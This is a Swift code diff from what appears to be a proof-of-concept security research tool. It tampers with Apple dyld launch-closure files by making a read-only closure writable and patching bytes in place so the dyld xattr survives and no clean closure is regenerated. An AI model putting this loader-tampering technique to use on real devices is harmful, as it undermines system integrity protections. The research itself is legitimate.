@@ -53,6 +53,7 @@ struct LoaderProbe {
 }
 
 enum Dyld4 {
+    static var lastWriteErrno: Int32 = 0
     static let magic: UInt32 = 0x7370_3464
     static let version: UInt32 = 0x9593_b355
 
@@ -98,7 +99,15 @@ enum Dyld4 {
     /// the `com.apple.dyld` xattr survives — unlike .atomic, which replaces
     /// the file and makes dyld regenerate a clean closure.
     static func writeInPlace(_ bytes: Data, at offset: UInt64, in path: String) -> Bool {
-        guard let fh = FileHandle(forWritingAtPath: path) else { return false }
+        // dyld creates the closure read-only (0444); chmod our own container
+        // file first — chmod preserves the xattr, unlike an atomic rewrite.
+        let cpath = strdup(path)!
+        defer { free(cpath) }
+        _ = chmod(cpath, mode_t(0o600))
+        guard let fh = FileHandle(forWritingAtPath: path) else {
+            lastWriteErrno = errno
+            return false
+        }
         do {
             try fh.seek(toOffset: offset)
             try fh.write(contentsOf: bytes)
@@ -173,7 +182,7 @@ enum Dyld4 {
         try? original.write(to: tokenSidecar().deletingLastPathComponent()
             .appendingPathComponent("dyld4-original.bin"), options: .atomic)
         guard writeInPlace(Data([0xff, 0xff]), at: UInt64(refOff), in: path) else {
-            return "PoC: in-place patch failed"
+            return String(format: "PoC: in-place patch failed errno=%d %@", Dyld4.lastWriteErrno, String(cString: strerror(Dyld4.lastWriteErrno)))
         }
         let t = token(path)
         return String(format: "PATCHED-IN-PLACE ref=0xffff count=%u token=%@ — FORCE-QUIT AND REOPEN", count, t)
